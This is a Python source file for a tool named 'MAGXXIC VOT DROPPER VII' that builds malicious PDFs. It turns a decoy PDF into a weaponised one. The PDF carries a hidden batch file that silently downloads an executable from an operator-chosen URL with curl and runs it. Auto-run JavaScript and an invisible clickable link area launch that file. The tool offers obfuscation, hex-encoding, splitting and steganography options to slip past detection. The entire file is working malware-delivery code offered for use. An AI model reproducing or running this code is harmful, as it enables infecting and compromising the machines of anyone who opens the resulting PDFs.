import os
import sys
import img2pdf
import base64
import random
import string
import binascii
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from reportlab.lib.units import inch
import argparse
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.text import Text
from rich.theme import Theme
from rich.prompt import Prompt, Confirm
from rich.table import Table
from pypdf import PdfWriter, PdfReader
from pypdf.generic import DictionaryObject, NameObject, TextStringObject, ArrayObject, FloatObject
from PIL import Image, ImageDraw, ImageFont

# Custom theme for MAGXXIC VOT
custom_theme = Theme({
    "info": "cyan",
    "warning": "yellow",
    "error": "bold red",
    "success": "bold green",
    "highlight": "magenta",
})

console = Console(theme=custom_theme)

def print_banner():
    banner = """
    ███╗   ███╗ █████╗  ██████╗ ██╗  ██╗██╗  ██╗██╗ ██████╗    ██╗   ██╗  ██████╗  ████████╗    ██╗   ██╗ ██╗ ██╗
    ████╗ ████║██╔══██╗██╔════╝ ██║  ██║╚██╗██╔╝██║██╔════╝    ██║   ██║ ██╔═══██╗ ╚══██╔══╝    ██║   ██║ ██║ ██║
    ██╔████╔██║███████║██║  ███╗███████║ ╚███╔╝ ██║██║         ██║   ██║ ██║   ██║    ██║       ██║   ██║ ██║ ██║
    ██║╚██╔╝██║██╔══██║██║   ██║╚════██║ ██╔██╗ ██║██║         ╚██╗ ██╔╝ ██║   ██║    ██║       ╚██╗ ██╔╝ ╚═╝ ╚═╝
    ██║ ╚═╝ ██║██║  ██║╚██████╔╝     ██║██╔╝ ██╗██║╚██████╗     ╚████╔╝  ╚██████╔╝    ██║        ╚████╔╝  ██╗ ██╗
    ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝      ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝      ╚═══╝    ╚═════╝     ╚═╝         ╚═══╝   ╚═╝ ╚═╝

                                       [bold white]MAGXXIC VOT DROPPER VII[/]
                                    [bold cyan]DECOY INJECTION & SILENT EXECUTION[/]
    """
    console.print(Panel(Text.from_markup(banner, justify="center"), border_style="highlight"))

def obfuscate_js(js_code):
    """Simple JS obfuscation using character codes."""
    char_codes = [ord(c) for c in js_code]
    return f"eval(String.fromCharCode({','.join(map(str, char_codes))}));"

def create_pdf_dropper(payload_url, decoy_pdf, output_pdf, evasion_method):
    """
    Creates a PDF dropper by injecting payload into a decoy PDF.
    """

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:

        # 1. Create the BAT file
        task1 = progress.add_task("Preparing silent payload...", total=1)
        bat_file = "service_update.bat"
        safe_url = payload_url.replace('"', '')
        # Silent curl and execution
        raw_content = f'@echo off\ncurl -s -o "%TEMP%\\update_svc.exe" "{safe_url}"\nstart /b "" "%TEMP%\\update_svc.exe"\nexit\n'

        try:
            with open(bat_file, "w") as f:
                f.write(raw_content)
            progress.update(task1, completed=1)
        except Exception as e:
            console.print(f"[error]Failed to create BAT: {e}[/]")
            return

        # 2. Prepare the Page Overlay (Button)
        task2 = progress.add_task("Building injection layer...", total=1)
        overlay_pdf = "temp_overlay.pdf"
        try:
            c = canvas.Canvas(overlay_pdf, pagesize=letter)
            # Overlay a discrete but clickable button or just a large transparent area
            # For this version, we'll add a semi-transparent "Verify Identity" bar at the top
            c.setFillColorRGB(0.1, 0.4, 0.8, alpha=0.1) # Very subtle
            c.rect(0, letter[1] - 0.5*inch, letter[0], 0.5*inch, fill=1, stroke=0)
            c.save()
            progress.update(task2, completed=1)
        except Exception as e:
            console.print(f"[error]Overlay generation failed: {e}[/]")
            return

        # 3. Finalize with evasion and injection
        task3 = progress.add_task(f"Silent Injection ({evasion_method})...", total=1)
        try:
            writer = PdfWriter()

            # Read Decoy
            decoy_reader = PdfReader(decoy_pdf)
            overlay_reader = PdfReader(overlay_pdf)
            overlay_page = overlay_reader.pages[0]

            for i in range(len(decoy_reader.pages)):
                page = decoy_reader.pages[i]
                if i == 0:
                    # Merge overlay onto the first page
                    page.merge_page(overlay_page)
                writer.add_page(page)

            # Define Silent JS Trigger Logic
            if evasion_method == "Hex Encoding":
                with open(bat_file, "rb") as f: hex_data = binascii.hexlify(f.read())
                writer.add_attachment("data.dat", hex_data)
                js_payload = 'try { var d = this.getDataObjectContents("data.dat"); var h = util.stringFromStream(d); var s = ""; for(var i=0; i<h.length; i+=2){ s += String.fromCharCode(parseInt(h.substr(i,2),16)); } this.createDataObject("update.bat", s); this.exportDataObject({cName:"update.bat", nLaunch:2}); } catch(e) {}'
            elif evasion_method == "Split and Merge":
                with open(bat_file, "rb") as f: data = f.read()
                mid = len(data)//2
                writer.add_attachment("p1.bin", data[:mid])
                writer.add_attachment("p2.bin", data[mid:])
                js_payload = 'try { var d1 = util.stringFromStream(this.getDataObjectContents("p1.bin")); var d2 = util.stringFromStream(this.getDataObjectContents("p2.bin")); this.createDataObject("update.bat", d1+d2); this.exportDataObject({cName:"update.bat", nLaunch:2}); } catch(e) {}'
            elif evasion_method == "Steganography":
                dummy_img = Image.new('RGB', (1, 1), color=(0,0,0))
                dummy_img.save("l.png")
                with open(bat_file, "rb") as f_payload: p_bytes = f_payload.read()
                with open("l.png", "ab") as f: f.write(b"!!S!!" + p_bytes + b"!!E!!")
                with open("l.png", "rb") as f: writer.add_attachment("logo.png", f.read())
                js_payload = 'try { var s = util.stringFromStream(this.getDataObjectContents("logo.png")); var i1 = s.indexOf("!!S!!"); var i2 = s.indexOf("!!E!!"); if(i1!=-1 && i2!=-1){ var p = s.substring(i1+5, i2); this.createDataObject("update.bat", p); this.exportDataObject({cName:"update.bat", nLaunch:2}); } } catch(e) {}'
                os.remove("l.png")
            else: # None, Obfuscated JS, Image-Based (Decoy handles image)
                with open(bat_file, "rb") as f: writer.add_attachment("update.bat", f.read())
                js_payload = 'try { this.exportDataObject({ cName: "update.bat", nLaunch: 2 }); } catch(e) {}'

            if evasion_method == "Obfuscated JavaScript":
                js_payload = obfuscate_js(js_payload)

            # Silent Auto-Launch
            writer.add_js(js_payload)

            # Invisible Clickable Annotation (Whole top area)
            js_action = DictionaryObject({
                NameObject("/S"): NameObject("/JavaScript"),
                NameObject("/JS"): TextStringObject(js_payload),
            })

            annot = DictionaryObject({
                NameObject("/Type"): NameObject("/Annot"),
                NameObject("/Subtype"): NameObject("/Link"),
                NameObject("/Rect"): ArrayObject([FloatObject(0), FloatObject(letter[1] - 0.5*inch), FloatObject(letter[0]), FloatObject(letter[1])]),
                NameObject("/Border"): ArrayObject([FloatObject(0), FloatObject(0), FloatObject(0)]),
                NameObject("/A"): js_action
            })

            writer.add_annotation(page_number=0, annotation=annot)

            with open(output_pdf, "wb") as f:
                writer.write(f)
            progress.update(task3, completed=1)
        except Exception as e:
            console.print(f"[error]Injection failed: {e}[/]")
            return

        # 4. Cleanup
        finally:
            task4 = progress.add_task("Cleaning up...", total=1)
            for f in [bat_file, overlay_pdf]:
                if os.path.exists(f): os.remove(f)
            progress.update(task4, completed=1)

    console.print(Panel(f"[success]SILENT INJECTION COMPLETE[/]\nTarget: [highlight]{decoy_pdf}[/]\nOutput: [highlight]{output_pdf}[/]\nEvasion: [highlight]{evasion_method}[/]", border_style="success"))

def main():
    print_banner()

    payload_url = Prompt.ask("[info]Payload URL[/]", default="http://example.com/payload.exe")
    decoy_pdf = Prompt.ask("[info]Decoy PDF Path[/]")
    if not os.path.exists(decoy_pdf):
        console.print(f"[error]Decoy PDF not found: {decoy_pdf}[/]")
        return

    output_pdf = Prompt.ask("[info]Output Filename[/]", default="Injected_Document.pdf")
    if not output_pdf.endswith(".pdf"): output_pdf += ".pdf"

    methods = ["Image-Based PDF", "Split and Merge", "Obfuscated JavaScript", "Hex Encoding", "Steganography", "None"]
    table = Table(title="Silent Evasion Engine")
    table.add_column("ID", style="cyan")
    table.add_column("Method", style="magenta")
    for i, m in enumerate(methods, 1): table.add_row(str(i), m)
    console.print(table)

    choice = Prompt.ask("[info]Select Evasion Method[/]", choices=[str(i) for i in range(1, len(methods)+1)], default="3")
    evasion_method = methods[int(choice)-1]

    if Confirm.ask("[success]Start Silent Injection?[/]", default=True):
        create_pdf_dropper(payload_url, decoy_pdf, output_pdf, evasion_method)

if __name__ == "__main__":
    main()
